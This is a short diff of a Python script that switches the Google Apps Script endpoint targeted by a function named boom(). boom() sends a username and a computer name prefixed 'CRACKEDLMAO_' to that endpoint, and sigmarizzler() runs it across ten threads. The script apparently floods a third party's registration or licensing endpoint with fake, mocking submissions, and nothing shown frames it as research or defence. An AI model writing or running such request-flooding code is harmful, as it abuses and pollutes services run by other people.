@@ -15,7 +15,7 @@ def boom():
     compName = f"CRACKEDLMAO_{INDIAUP()}"
     encodedUser = urllib.parse.quote(username)
     encodedPC = urllib.parse.quote(compName)
-    fullURL = f"https://script.google.com/macros/s/AKfycbys_0dn2UPA4fXqNgqqYIHnUxoDUIusA8BoIVSghSJ8BR7colxlDEYLhqvv4OVCE6Is/exec?username={encodedUser}&computer={encodedPC}"
+    fullURL = f"https://script.google.com/macros/s/AKfycbyaY3CJTgG2ZV3HxY6d30K3t-PAhJKCVeJU9RSAziSoAmxBiWhY06ATUVDQJ2z39S_-/exec?username={encodedUser}&computer={encodedPC}"
     response = requests.get(fullURL)
     if response.status_code == 200:
         print("done", response.text)
@@ -24,7 +24,7 @@ def boom():
 
 def sigmarizzler(num_threads=10):
     threads = []
-    
+
     for _ in range(num_threads):
         thread = threading.Thread(target=boom)
         threads.append(thread)
